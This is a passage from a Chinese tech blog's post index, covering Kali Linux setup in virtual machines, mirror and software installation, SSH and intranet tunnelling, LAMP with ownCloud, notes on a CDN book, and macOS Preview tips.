\n![命名虚拟机](https://up-img.yonghong.tech/pic/2021/07/29-16-32-pic_27-8vGQ5b.jpeg)\n\n1. 在该界面为虚拟机创建一个名称，并设置虚拟机的安装位置。设置完成后，单击“下一步”按钮  \n![指定磁盘容量](https://up-img.yonghong.tech/pic/2021/07/29-16-37-pic_28-YU6ElX.jpeg)\n\n1. 在该界面设置磁盘的容量。如果有足够大的磁盘时，建议设置的磁盘容量大点，避免造成磁盘容量不足。这里设置为50GB  \n\n2. 该界面显示了所创建虚拟机的详细信息，此时就可以创建操作系统了。然后单击“完成”按钮  \n![创建虚拟机](https://up-img.yonghong.tech/pic/2021/07/29-16-38-pic_29-ynmiRn.jpeg)\n\n1. 该界面显示了新创建的虚拟机的详细信息。现在准备安装Kali Linux。在安装Kali Linux之前需要设置一些信息，在VMware Workstation窗口中单击“编辑虚拟机设置”  \n![编辑虚拟机设置](https://up-img.yonghong.tech/pic/2021/07/29-16-38-pic_30-knxnmD.jpeg)\n\n1.  在该界面选择“CD/DVD（IDE）”选项，接着在右侧选择“使用ISO映像文件”复选框，单击“浏览”按钮，选择Kali Linux的映像文件。然后单击“确定”按钮  \n\n2.  选择“开启此虚拟机”命令  \n\n3.  接下来的安装过与实体机相同  \n\n### 安装 VMware Tools\n\nVMware Tools 是 VMware 虚拟机中自带的一种增强工具。它是 VMware 提供的增强虚拟显卡和硬盘性能，以及同步虚拟机与主机时钟的驱动程序。只有在 VMware 虚拟机中安装好 VMware Tools 工具后，才能实现主机与虚拟机之间的文件共享，同时可支持自由拖曳的功能，鼠标也可在虚拟机与主机之间自由移动（不用再按Ctrl +Alt组合键）。本小节将介绍 VMware Tools 程序的安装。\n\n1.在 VMware Workstation 菜单栏中，依次选择 “虚拟机”->“安装VMware Tools…” 命令  \n![编辑虚拟机设置](https://up-img.yonghong.tech/pic/2021/07/29-16-38-pic_31-sKjtcv.jpeg)\n\n2.挂载VMware Tools安装程序到/mnt/cdrom/目录。执行命令如下  \n\n```shell\nroot@kali:~# mkdir /mnt/cdrom/               #创建挂载点\nroot@kali:~# mount /dev/cdrom /mnt/cdrom/ #挂载安装程序\nmount: block device /dev/sr0 is write-protected, mounting read-only\n```\n\n看到以上的输出信息，表示VMware Tools安装程序挂载成功了。  \n\n3.切换到挂载位置，解压安装程序VMwareTools。执行命令如下  \n\n```shell\nroot@kali:~# cd /mnt/cdrom/                          #切换目录\nroot@kali:/mnt/cdrom# ls                          查看当前目录下的文件\nmanifest.txt VMwareTools-9.6.1-1378637.tar.gz vmware-tools-upgrader-64\nrun_upgrader.sh vmware-tools-upgrader-32\nroot@kali:/mnt/cdrom# tar zxvf VMwareTools-9.6.1-1378637.tar.gz -C / #解压VMwareTools安装程序\n```\n\n执行以上命令后，VMware Tools程序将被解压到/目录中，并生成一个名为vmware-tools-distrib文件夹  \n\n4.切换到VMware Tools的目录，并运行安装程序。执行命令如下  \n\n```shell\nroot@kali:/mnt/cdrom# cd /vmware-tools-distrib/      #切换目录\nroot@kali:/vmware-tools-distrib# ./vmware-install.pl #运行安装程序\n```\n\n执行以上命令后，会出现一些问题。这时按下“回车”键，接受默认值。   \n\n5.重新启动计算机，这样就安装好了  \n\n### 在 Parallel Desktop 上安装 Kali\n\n1. 打开 Parallel Desktop，新建一个虚拟机 Create New  \n![start](https://up-img.yonghong.tech/pic/2021/07/29-16-39-pic_1-8RQ38Y.png)\n\n1. 选择安装镜像，PD 会自动检测到安装的系统  \n![镜像](https://up-img.yonghong.tech/pic/2021/07/29-16-39-pic_2-DYo9Ei.png)\n\n1. 填写虚拟机名称保存位置，勾选在安装前进行自定义设置（Customize settings before installation）  \n![勾选自定义设置](https://up-img.yonghong.tech/pic/2021/07/29-16-39-pic_3-oMgwsB.png)\n\n1. 在安全选项中，设置与 macOS 隔离 isolate Linux from Mac，为的是尽量与实体机相像，减少干扰。  \n![设置](https://up-img.yonghong.tech/pic/2021/07/29-16-39-pic_4-Jizt2o.png)\n\n1. 后面的工作和实体机安装一样了\n\n### 安装 Parallel Tools\n\nParallel Tools 是和 VMware Tools 类似的工具。\n\n首先要先更新一下系统，这部分请看 [第 3 部分 和 第 4 部分](#update) ，很重要，很可能这里会出现问题。\n\n安装 Parallel Tools 还可能会出现一点小问题，点击右上角的小三角，Install Parallel Tools。  \n![paralleltool](https://up-img.yonghong.tech/pic/2021/07/29-16-39-pic_23-8OAZ3V.png)\n\n这样加载的 cdrom 权限不够可以把 cdrom 的文件复制到本地修改权限才可以完成\n\n```shell\numount /media/chrom0\nmount -o exec /media/cdrom0\ncd /media/cdrom/ && ./install-gui\n```\n\n如果这样还不能成功的话，就把 cdrom 中的内容复制出来。\n\n```shell\nmkdir ~/Desktop/tem/\ncp /media/cdrom0 /tem/\nchmod -R 777 ~/Desktop/tem/\ncd ~/Desktop/tem\n./install-gui\n```\n\n这样按照要求一步一步进行就可以了。\n\n---\n\n<span id=\"update\"></span>\n\n## 3.更改更新源 \n\n国内的更新源有很多，比如下面的几个更新源\n\n[科大开源镜像站](http://mirrors.ustc.edu.cn/)   \n[Alibaba Open Source Mirror Site](https://mirrors.aliyun.com/)   \n[网易开源镜像站](https://mirrors.163.com/)   \n[清华大学开源软件镜像站](https://mirrors.tuna.tsinghua.edu.cn/)   \n\n因为我在学校，所以我选择了[科大开源镜像站](http://mirrors.ustc.edu.cn/)\n\n配置镜像源的方法看 [Kali Linux 源使用帮助](http://mirrors.ustc.edu.cn/help/kali.html)\n\n编辑 `/etc/apt/sources.list` 文件, 在文件最前面添加以下条目：\n\n```\ndeb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\ndeb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n```\n\n更改完 `sources.list` 文件后请运行 `sudo apt-get update` 更新索引以生效。\n\n## 4.更新软件 \n\n```shell\napt clean && apt update -y && apt upgrade -y && apt dist-upgrade -y \n```\n\n## 5.安装好了为什么无法进入登录页面（灰屏）\n\n这个问题是针对实体机上安装的 Kali 出现的情况，实际上不是没有安装好，灰屏的原因是因为系统检测出了两块屏幕（原因还不清楚：如果有人知道请在下面评论），恰好登录页面不是你用的这个屏幕。\n\n那么就不影响登录，登录要求输入两个内容，一个是用户名，一个是密码。因此输入 `root` 后按下 回车键 后输入密码，再次 回车键 就 OK 了。之后可以在系统中进行设置，设置为一个屏幕，这个也只是此用户的范围，再次重启时还会遇到问题。等以后解决了再回来改此文。\n\n## 参考\n\n[大学霸Kali Linux 安全渗透教程](https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/)\n\n[Parallels Desktop 11 安装 Kali 2.0 Parallels tools](http://blog.csdn.net/simple_the_best/article/details/50754616)\n\n","categories":["Kali"],"tags":["Kali"]},{"title":"Kali Linux 实战教程（二） —— 安装办公软件","url":"/2018/03/2018-03-02-kali-002/","content":"\n本节教程介绍了学习 Linux 命令的网站，分享了安装中文输入法和 WPS 的一些经验。\n\n<!-- more -->\n\n## Linux 命令基础教程\n\n这部分推荐下面的教程。另外我在操作系统课中给同学们分享了我自己做一个 PPT , [The Linux Command Line - 下载](https://download.0xl2oot.cn/The-Linux-Command-Line.pdf)\n\n[Linux命令大全](http://man.linuxde.net/)\n\n[每天一个linux命令](http://www.cnblogs.com/peida/archive/2012/12/05/2803591.html)\n\n## 安装中文输入法\n\n```\napt install ibus ibus-pinyin  \nibus-setup\n```\n\n在设置中找到“区域和语言”，进入。\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-41-pic_pinyin_1-mO8pGJ.jpg)\n\n点击“+”，找到“汉语中国”，选中添加，然后在桌面选择输入法。\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-41-pic_pinyin_2-816ADX.jpg)\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-41-pic_pinyin_3-gGVGuG.jpg)\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-41-pic_pinyin_4-0dcojR.jpg)\n\n\n最后重启就可以使用中文的输入法了。\n\n## 安装 WPS\n\n首先需要安装一个 libpng12-0 的依赖，因为 WPS 需要。\n\n```\napt install libpng12-0\n```\n\n然后去 [WPS 的官网](http://community.wps.cn/download/) 上下载所需的 WPS 安装包。\n\n安装命令如下：\n\n```\ndpkg -i wps-office_10.1.0.5672~a21_amd64.deb\n```\n\n用wps打开一个文档时报 No necessary symbol fonts ；\n\n解决：打开[链接](https://download.0xl2oot.cn/linux-wps-office-fonts.zip)，下载压缩包，然后解压缩并将压缩包内的所有文件复制到 /usr/share/fonts 目录下.\n\n\n## 参考\n\n[如何在Kali Linux 2.0 安装ibus中文拼音输入法](https://jingyan.baidu.com/article/8cdccae922f703315413cd0e.html)\n\n[WPS 社区 wiki](http://community.wps.cn/wiki/)\n\n[Kali linux下解决wps office 安装以及依赖问题](http://blog.csdn.net/github_39217805/article/details/73465999)\n\n[Ubuntu17.04安装wps](http://blog.csdn.net/MoMo_Goder/article/details/78401688)\n","categories":["Kali"],"tags":["Kali"]},{"title":"Kali Linux 实战教程（三） ——  花生壳内网穿透","url":"/2018/03/2018-03-03-kali-003/","content":"\n本节教程讲解了如何添加用户，如何开启 ssh 服务，如何设置内网穿透等。\n\n<!-- more -->\n\n## 添加用户\n\n```\nadduser xwz\t\t//新建用户，用户名为 xwz\n```\n\n之后会要求输入新的用户的密码，Kali Linux 还要求输入用户的一些信息，我们不用管默认按回车就行。\n\n## 给新用户添加权限\n\n如果不进行这一步，使用非 root 用户时，不能使用 sudo 命令。会报错\n\n```\nxx is not in the sudoers file. This incident will be reported.\n```\n\n一、 `whereis sudoers`  找出文件所在的位置，默认都是 `/etc/sudoers`   \n        \n二、 `chmod u+w /etc/sudoers`  修改文件权限即添加文件拥有这的写权限，`ls -al /etc/sudoers` 可以查看原文件的权限。   \n   \n三、 `vim /etc/sudoers` 编辑文件，在 `root ALL=(ALL)ALL` 行下添加 `XXX ALL=(ALL)ALL`， `XXX` 为你的用户名。添加方法：找到root行，按下 `i` 键进入编辑模式添加即可！编辑好后 `esc` 键进入一般模式，键入 `：wq` 保存退出！\n\n四、 最后， `chmod u－w /etc/sudoers`  回到文件的原权限！\n\n## 开启 ssh\n\n1.配置SSH参数\n\n修改 `sshd_config` 文件，命令为：\n\n```\nvim /etc/ssh/sshd_config\n```\n\n将 `#PasswordAuthentication yes` 的注释去掉\n\n然后，保存，退出vim。\n\n2.启动SSH服务\n\n命令为：\n\n```\n/etc/init.d/ssh start\nor\nservice ssh start\n```\n\n查看SSH服务状态是否正常运行，命令为：\n\n```\n/etc/init.d/ssh status\nor\nservice ssh status\n```\n\n3.设置开机自动启动 ssh 服务\n\n```\nupdate-rc.d ssh enable   //系统自动启动SSH服务\nupdate-rc.d ssh disabled // 关闭系统自动启动SSH服务\n```\n\n## 花生壳内网穿透\n\n安装过程请看 [花生壳 3.0 for Linux 相关安装使用文档](http://service.oray.com/question/4287.html)\n\n下载 [花生壳客户端](https://hsk.oray.com/download/)\n\n\n```shell\ndpkg -i phddns_3.0_x86_64.deb\nphddns start\n```\n\n记下 SN 。登录用\n\n之后就可以配置 [内网穿透](http://service.oray.com/question/1664.html) ，可以自定义端口为 22，即 ssh 的端口，\n\n这样之后就可以用下面的命令登录\n\n```\nssh -p 端口号 用户名@域名\n```\n\n\n## 参考\n\n[Linux添加/删除用户和用户组](http://www.cnblogs.com/xd502djj/archive/2011/11/23/2260094.html)\n\n[xx is not in the sudoers file 问题解决](http://www.cnblogs.com/evasnowind/archive/2011/02/04/1949113.html)\n\n[Kali 开启 ssh 服务](https://www.cnblogs.com/itlyh/p/6045930.html)\n\n\n\n","categories":["Kali"],"tags":["Kali"]},{"title":"《CDN 技术详解》读书笔记","url":"/2018/03/2018-03-04-cdn/","content":"\n## CDN 的基本概念\n\n对于 CDN 这个名词，读者大可以望文生义：Content Distribute Network, 直译成内容分发网络，也有人写成 Content Delivery Network, 内容交付网络。CDN 完成的是将内容从源站传递到用户端的任务，我们当然不需要再解释什么叫作“内容分发”或者“内容交付”了，要解释的是 CDN 在这个分发或者交 付的过程中体现了什么价值，为什么需要 CDN 来交付而不是直接通过互联网 交付呢？理解了这个 问题对理解本书中 CDN 的工作原理、各项关键技术都有帮助。\n\n<!-- more -->\n\n## CDN 的基本工作过程\n\n使用 CDN 会极大地简化网站的系统维护工作量，网站维护入员只需将网站内容注入 CDN 的系统，通过 CDN 部署在各个物理位置的服务器进行全网分 发，就可以实现跨运营商、跨地域的用户覆盖。 由于 CDN 将内容推送到网络边缘，大量的用户访问被分散在网络边缘，不再构成网站出口、互联互通点的资源挤占，也不再需要跨越长距离 IP 路由了。\n\n\nCDN 是如何工作的呢？让我们先看看没有 CDN 服务时，一个网站是如何向用户提供服务的。\n\n今天我们看到的网站系统基本上都是基于 B/S 架构的。 B/S 架构，即 Browser-Server (浏览器－服务器）架构，是对传统 C/S 架构的一种变化或者改进架构。 在这种架构下，用户只需使用通用浏览器，主要业务逻辑在服务器端实现。 B/S 架构，主要是利用了不断成熟的 WWW 浏览器技术，结合浏览器的多种 Script 语言 ( VBScript、JavaScript 等）和 ActiveX 等技术，在通用浏览器上实现了 C/S 架构下需要复杂的软件才能实现的强大功能。\n\n用户通过浏览器等方式访问网站的过程如图 1 -2 所示。\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-43-1-XR8Pt3.png)\n\n①用户在自己的浏览器中输入要访问的网站域名。\n\n②浏览器向本地 DNS 服务器请求对该域名的解析。\n\n③本地 DNS 服务器中如果缓存有这个域名的解析结果，则直接响应用户的解析请求。\n\n④本地 DNS 服务器中如果没有关于这个域名的解析结果的缓存，则以递归方式向整个 DNS 系统请求解析，获得应答后将结果反馈给浏览器。\n\n⑤浏览器得到域名解析结果，就是该域名相应的服务设备的 IP 地址。\n\n⑥浏览器向服务器请求内容。\n\n⑦服务器将用户请求内容传送给浏览器。\n\n在网站和用户之间加入 CDN 以后，用户不会有任何与原来不同的感觉。 最简单的 CDN 网络有一个 DNS 服务器和几台缓存服务器就可以运行了。一个 典型的 CDN 用户访问调度流程如图 1 -3 所示。\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-43-2-2jwsLn.png)\n\n\n①当用户点击网站页面上的内容 URL, 首先会由网站的权威 DNS 服务器来进行域名解析，该权威 DNS 服务器中会有一条 CNAME 记录，指示将域名的解析权交给 CDN 专用 DNS 服务器。\n\n②CDN 的 DNS 服务器将 CDN 的全局负载均衡设备 IP 地址作为域名解析结果返回用户，此时 CDN 系统巳经接管了网站的用户访间\n\n③用户向 CDN 的全局负载均衡系统发起内容 URL 访问请求。\n\n④-⑥CDN 的负载均衡系统经过全局－区域两级均衡系统的综合分析，选择一台最优服务器／集群为用户服务，并将这个设备/集群的 IP 地址返回给用户 （由全局负载均衡系统返回还是由区域负载均衡系统返回，取决于 CDN 自身实现方式）。 挑选最优服务器的依据包括：根据用户 IP 地址，判断哪一台服务器距用户最近；根据用户所请求的 URL 中携带的内容名称，判断哪一台服务器上有用户所需内容；查询各个服务器当前的负载情况，判断哪一台服务器尚有服务能力。 基于以上这些条件的综合分析之后，区域负载均衡设备会向全局负载均衡设备返回一台缓存服务器的 IP 地址。\n\n⑦用户向最优服务器发起请求，服务器响应用户请求，将用户所需内容传送到用户终端。 如果这台服务器上并没有用户想要的内容，而负载均衡系统依 然将它分配给了用户，那么这台服务器就要向它的上一级服务器请求内容，直至追溯到网站的源服务器将内容拉到本地并为用户提供服务。\n\n使用 CDN 服务的网站，只需将其域名解析权交给 CDN，容注入 CDN, 就可以实现内容加速了。\n\n\n\n## CDN 的系统架构\n\n### 功能架构\n\nCDN 技木自 1998 年诞生以来，伴随着互联网的高速发展，其技术一直在持续演进和完善，但基本的 CDN 功能架构在 2003 年左右就已基本形成和稳定下来。从功能上划分，典型的 CDN 系统架构由分发服务系统、负载均衡系统和运营管理系统三大部分组成，如图 2-1 所示 。\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-43-3-nFVaqE.png)\n\n\n首先，来看看**分发服务系统**。该系统的主要作用是实现将内容从内容源中心向边缘的推送和存储，承担实际的内容数据流的全网分发工作和面向最终用户的数据请求服务。分发服务系统最基本的工作单元就是许许多多的 Cache 设备（缓存服务器），Cache 负责直接响应最终用户的访问请求，把缓存在本地的内容快速地提供给用户。同时 Cacbe 还负责与原站点进行内容同步，把更新的内容以及本地没有的内容从源站点获取并保存在本地。\n\n一般来说，根据承载内容类型和服务种类的不同，分发服务系统会分为多个子服务系统，如网页加速子系统、流媒体加速子系统、应用加速子系统等。每个子服务系统都是一个分布式服务集群，由一群功能近似的、在地理位置上分布部署的 Cache 或 Cache 集群组成，彼此间相互独立。每个子服务系统设备集群的数量根据业务发展和市场需要的不同，少则几十台，多则可达上万台，对外形成一个整体，共同承担分发服务工作。Cache 设备的数量、规模、总服务能力是衡量一个 CDN 系统服务能力的最基本的指标。\n\n对于分发服务系统，在承担内容的更新、同步和响应用户需求的同时，还需要向上层的调度控制系统提供每个 Cache 设备的健康状况信息、响应情况， 有时还需要提供内容分布信息，以便调度控制系统根据设定的策略决定由哪个 Cache (组）来 响应用户的请求最优 。\n\n**负载均衡系统**是一个 CDN 系统的神经中枢，主要功能是负责对所有发起 服务请求的用户进行访问调度，确定提供给用户 的 最终实际访问地址。大多数 CDN 系统的负载均衡系统是分级实现的，这里以最基本的两级调度体系进行简 要说明。一般而言，两级调度体系分为全局负载均衡 ( GSLB ) 和本地负载均 衡 ( SLB )。其中，全局负载均衡 (GSLB ) 主要根据用户就近性原则， 通过对每个服务节点进行 “ 最优 ” 判断，确定向用户提供服务的 Cache 的物理位置。最通用 的 GSLB 实现方法是基千 DNS 解析 的方式实现，也 有一些系统采用了 应用层重定向等方式来解决，关于 GSLB 的原理和实现方法将在本书第 5 章进 行讲解。本地负载均衡 ( SLB ) 主要负责节点内部的设备负载均衡，当用户请 求从 GSLB 调度到 SLB 时，SLB 会根据节点内各 Cache 设备的实际能力或内容 分布等因素对用户进行重定向，常用的本地负载均衡方法有基于 4 层调度、基于 7 层调度、链路负载调度等.\n\nCDN 的**运营管理系统**与一般的电信运营管理系统类似，分为运营管理和网络管理两个子系统。运营管理子系统是 CDN 系统的业务管理功能实体，负责 处理业务层面的与外界系统交互所必需的一些收集、整理、交付工作，包含客户管理、产品管理、计费管理、统计分析等功能。其中客户管理指对使用 CDN 业务的客户进行基本信息和业务规则信息的管理，作为 CDN 服务提供的依据。产品管理，指 CDN 对外提供的具体产品包属性描述、产品生命周期管理、产品审核、客户产品状态变更等。计费管理，指在对客户使用 CDN 资源情况的记录的基础上，按照预先设定的计费规则完成计费并输出账单。统计分析楼块负责从服务模块收集日常运营分析和客户报表所衙数据，包括资源使用情况、内容访问情况、各种排名、用户在线清况等数据统计和分析，形成报表提供给网管入员和 CDN 产品使用者。网络管理子系统实现对 CDN 系统的网络设备管理、拓扑管理、链路监控和故障管理，为管理员提供对全网资源进行集中化管理操作的界面，通常是基千 Web 方式实现的 。\n\n\n### 部署架构\n\nCDN 系统设计的首要目标是尽量减少用户的访问响应时间，为达到这一目标， CDN 系统应该尽量将用户所需要的内容存放在距离用户最近的位置。也就是说，负责为用户提供内容服务的 Cache 设备应部署在物理上的网络边缘位置，我们称这一层为 CDN 边缘层。CDN 系统中负责全局性管理和控制的设备组成中心层，中心层同时保存着最多的内容副本，当边缘层设备未命中时，会向中心层请求，如果在中心层仍未命中，则需要中心层向涌站回涌。不同 CDN 系统设计之间存在差异，中心层可能具备用户服务能力，也可能不直接提供服务，只向下级节点提供内容。如果 CDN 网络规模较大，边缘层设备直接向中心层 请求内容或服务会造成中心层设备压力过大，就要考虑在边缘层和中心层之间部署一个区域层，负责一个区域的管理和控制，也保存部分内容副本供边缘层访问 。\n\n图 2-3 是一个典型的 CDN 系统三级部署示意图 。\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-43-4-74NKRo.png)\n\n\n节点是 CDN 系统中最基本的部署单元，一个 CDN 系统由大量的、地理位置上分散的 POP 节点组成 ． 为用户提供就近的内容访问服务。CDN 节点网络 主要包含 CDN 骨干点和 POP 点。CDN 骨干点和 CDN POP 点在功能上不同，中心和区域节点一般称为骨干点，主要作为内容分发和边缘未命中时的服务点 ； 边缘节点又被称为 POP ( point-of-presence ) 节点， CDN POP 点主要作为直接\n向用户提供服务的节点。但是 ，从节点构成上来说 ，无论是 CDN 骨干点还是CDN POP 点 ，都由 Cache 设备和本地负载均衡设备构成。\n\n在一个节点中 ，Cache 设备和本地负载均衡设备的连接方式有两种:一种是旁路方式，一种是穿越方式, 如图 2-4 所示 。\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-43-5-lNqIeC.png)\n\n在穿越方式下，SLB 一般由 L4-7 交换机实现. SLB 向外提供可访问的公网 IP 地址 ( VIP ), 每台 Cache 仅分配私网 IP 地址，该台 SLB 下挂的所有 Cache 构成一个服务组。所有用户请求和媒体流都经过该 SLB 设备，再由 SLB 设备进行向上向下转发。SLB 实际上承担了 NAT ( Network Address Translation, 网络地址转换）功能，向用户屏蔽了 Cache 设备的 IP 地址。这种方式是 CDN 系统中应用较多的方式，优点是具有较高的安全性和可靠性，缺点是 L4-7 交换机 通常较为昂贵。另外，当节点容最大时，L4-7 交换机容易形成性能瓶颈。不过近年来，随着 LVS 等技术的兴起，SLB 设备价格有了大幅下降 。\n\n在旁路方式下，有两种 SLB 实现方式。在早期，这种 SLB 一般由软件实现。SLB 和 Cache 设备都具有公共的 IP 地址，SLB 和 Cache 构成并联关系。用户需要先访问 SLB 设备，然后再以重定向的方式访问特定的 Cache。 这种实现方式简单灵活，扩展性好，缺点是安全性较差，而且需要依赖千应用层重定 向。随着技术的发展， L4-7 交换机也可采用旁路部署方式，旁挂在路由交换设备上，数据流量通过三角传输方式进行。\n\n在 CDN 系统中，不仅分发服务系统和调度控制系统是分布式部署的，运营管理系统也是分级分布式部署的，每个节点都是运营管理数据的生成点和采集点，通过日志和网管代理等方式上报数据。可以说，CDN 本身就是一个大型的具有中央控制能力的分布式服务系统 。\n\n\n\n\n\n\n","categories":["CDN"],"tags":["CDN"]},{"title":"Kali Linux 实战教程（四） ——  简单的 APR 攻击","url":"/2018/03/2018-03-04-kali-004/","content":"\n本节教程分享了一个简单的 ARP 攻击示例，ARP（Address Resolution Protocol）是地址解析协议，是一种将IP地址转化成物理地址的协议。\n\n<!-- more -->\n\n## 原理\n\nARP\n\n## 工具介绍\n\n## 实战\n\n\n## 参考\n\ni 春秋 ","categories":["Kali"],"tags":["Kali"]},{"title":"Kali Linux 实战教程（五） ——  搭建私人网盘","url":"/2018/03/2018-03-05-kali-005/","content":"\n本节教程主要是为了练习在 Linux 中使用 lamp 环境，Kali Linux 自带了几个网络服务，它们是非常有用的。但是默认是禁用的。这里给大家分享一下。\n\n<!-- more -->\n\n## Apache\n\nKali Linux 默认已经安装了 Apache，MySQL 和 PHP，只是默认是禁用的。\n\n开启关闭方法\n\n```\nroot@monster:~# service apache2 start | stop | restart | status\n```\n\n也可以查看软件的安装位置\n\n```\nroot@monster:~# whereis apache2\napache2: /usr/sbin/apache2 /usr/lib/apache2 /etc/apache2 /usr/share/apache2 /usr/share/man/man8/apache2.8.gz\n```\n\n开启成功之后可以打开浏览器，输入 `localhost` 或 `127.0.0.1`，可以看到 Apache 的欢迎页面。\n\n## MySQL\n\n开启关闭方法\n\n```\nroot@monster:~# service mysql start | stop | restart | status\n```\n\n开启成功之后，可以用 `mysql -u root` 直接登录 MySQL，关于 MySQL 的用法可以自行搜索。Kali Linux 的 MySQL 默认是没有密码的，可以修改密码，创建用户等等。\n\n## PHP\n\nKali Linux 的 PHP 默认编译的模块十分有限。\n\n如果开启 Apache 成功之后，就可以使用 PHP 了。这里推荐一个 [PHP 探针——刘海探针](https://github.com/kmvan/x-prober), [直接下载](https://download.0xl2oot.cn/tz.php)，将下载好的 tz.php 放在网站的根目录下（默认是 /var/www/html/），打开浏览器访问 [localhost/tz.php](http://localhost/tz.php) 即可查看服务器相关参数，以及 PHP 的相关配置。\n\n由于 PHP 默认没有安装 MySQL 模块，所以不会显示数据库等等信息。下面是解决办法，安装 php7.0-mysql 模块（PHP 版本是7.0）后重启 Apache 服务。\n\n```\napt install php7.0-mysql\nservice apache2 restart\n```\n\n## ownCloud 私人网盘\n\n[ownCloud - The last file sharing platform you'll ever need.](https://owncloud.org/)\n\n下载 [ownCloud 安装包](https://owncloud.org/download/)\n\n![ownCloud](https://up-img.yonghong.tech/pic/2021/07/29-16-45-owncloud-ZadMlw.png)\n\n解压，把解压后的文件夹放到网站的根目录下（默认是 /var/www/html/），更改权限为777.\n\n登录 MySQL 创建一个数据库，名称为 `owncloud`，安装的时候会用到。\n\n然后在浏览器中输入 [localhost/owncloud/](http://localhost/owncloud/) 开始安装。创建一个用户名，选择文件存储目录，选择数据库，输入数据库用户名密码。\n\n这时候可能会报错，比如 PHP 的模块未安装，文件的权限不够，或者自定义的文件存储目录权限错误等等。\n\n可以使用下面的命令安装 owncloud 报错信息中提到的 PHP 模块，重启 Apache 服务，刷新页面就可以登录自己的私人网盘了。\n\n```\napt install php7.0-zip\napt install php7.0-dom\napt install php7.0-XMLWriter\napt install php7.0-intl\napt install php7.0-mb\napt install php7.0-gd\napt install php7.0-curl\nservice apache2 restart\n```\n\n文件权限不足可以更改权限为 777 试一下。\n\n自定义的文件存储目录要更改文件夹的用户和组\n\n```\nchown -R www-data:www-data /目录完整路径\nchmod -R 770 /目录完整路径\n```\n\n这样应该就没有问题了。\n\n\n## 参考\n\n[Install ownCloud 官方安装手册](https://doc.owncloud.org/server/latest/admin_manual/installation/source_installation.html#install-owncloud)\n\n","categories":["Kali"],"tags":["Kali"]},{"title":"macOS 技巧（1）——「预览的使用」","url":"/2018/03/2018-03-06-mac-tips-preview/","content":"\n> 多图预警！多图预警！多图预警！\n\nmacOS 自带的「预览.app（Preview.app）」 功能十分强大，可以用来阅读 PDF（做笔记），查看和编辑图片等，还可以通过安装丰富的插件实现其他文件的预览。\n\n<!-- more -->\n\n## 阅读和编辑 PDF\n\n用预览打开一个 PDF 文档，可以看到右上角有一个编辑的按钮（如图，箭头所指），单击一下，会出现下面的一排功能按钮，每一个功能都很实用，下面我来简单介绍一下。\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-46-001-dBBqoj.png)\n\n- 〇裁剪工具，画出矩形选区，裁剪。  \n- ①智能线条，线条粗细不变，可以画出直线，曲线，甚至是解说气泡。    \n- ②智能线条，可以根据触摸板按压力度确定线条粗细  \n- ③多边形工具，可以画出直线，箭头，矩形，圆角矩形，圆，椭圆，任意正多边形，任意正多角形。  \n- ④文字工具  \n- ⑤签名，可以通过触摸板手写或者在纸上写好签名对着摄像头扫描   \n- ⑥笔记批注工具  \n- ⑦调整以上所有线条的粗细，包括多边形边框  \n- ⑧调整多边形边框颜色  \n- ⑨调整多边形填充颜色，无即为透明  \n- ⑩调整字体，大小等\n\n此外，右上角还有一个笔形的工具，可以给文字内容加高亮，下划线，删除线。\n \n## 查看和编辑图片\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-46-002-LIkJpk.png)\n\n如图所示，编辑图片比 PDF 不同的三个功能（哦，不对是两个，忽略第一个箭头）分别是调整颜色，调整图片大小。\n\n调整颜色有基本的曝光度，色调，色温等等。\n\n调整图片大小可以自定义大小和预设的大小，这样可以很方便的压缩图片。\n\n## 其他技巧\n\n### 重排和拼接 PDF 文档\n\n在预览中打开 PDF 文档，选择左上角的「缩图清单」（Contact Sheet）选项，拖动想要调换顺序的页面即可调换顺序，也可以按住 command 键来选择多个页面。\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-46-003-NdXmnU.png)\n\n在预览中打开另一个文档，同样选择左上角的「缩图清单」（Contact Sheet）选项，可以将一个 PDF 的页面拖动到另一个 PDF 文档中。\n\n### 旋转翻转图片\n\n旋转图片可以点击工具栏的旋转按钮，默认是逆时针旋转，也可以按住 option 键，这样就变了顺时针旋转。也可以在菜单栏中选择「工具」-> 旋转，可以发现，还可以用 command + L 和 command + R 进行旋转。\n\n翻转图片可以在菜单栏中选择「工具」-> 水平翻转/垂直翻转。\n\n\n## [插件](https://github.com/sindresorhus/quick-look-plugins)\n\n> 插件来源为 GitHub 上的一个项目，看起来一直在更新，可以从[源项目](https://github.com/sindresorhus/quick-look-plugins)中查看。\n\n### 安装\n\n#### 使用 [Homebrew Cask](https://github.com/phinze/homebrew-cask)\n\n- 运行 `brew cask install <package>`\n\n<span id=\"install-all\"></span>\n\n##### 安装全部\n\n```\nbrew cask install qlcolorcode qlstephen qlmarkdown quicklook-json qlprettypatch quicklook-csv betterzipql qlimagesize webpquicklook suspicious-package quicklookase qlvideo\n```\n\n#### 手动安装\n\n- 点击 \"手动下载\"\n- 将下载的 .qlgenerator 文件移动到 `~/Library/QuickLook`\n- 运行 `qlmanage -r`\n\n\n### 插件列表\n\n\n#### [QLColorCode](https://github.com/anthonygelibert/QLColorCode)\n\n> 预览代码，有基本的语法高亮\n\n运行 `brew cask install qlcolorcode` or [手动下载](https://github.com/anthonygelibert/QLColorCode/releases/latest)\n\n[![](https://up-img.yonghong.tech/pic/2021/07/29-16-47-QLColorCode-V6SfbN.png)](https://github.com/anthonygelibert/QLColorCode)\n\n\n#### [QLStephen](https://github.com/whomwah/qlstephen)\n\n> 预览无拓展名的普通文本文件，如：README, CHANGELOG, index.styl 等等.\n\n运行 `brew cask install qlstephen` or [手动下载](https://github.com/whomwah/qlstephen/releases/latest)\n\n[![](https://up-img.yonghong.tech/pic/2021/07/29-16-48-QLStephen-mBHrZO.png)](https://github.com/whomwah/qlstephen)\n\n\n#### [QLMarkdown](https://github.com/toland/qlmarkdown)\n\n> 预览 Markdown 文件\n\n运行 `brew cask install qlmarkdown` or 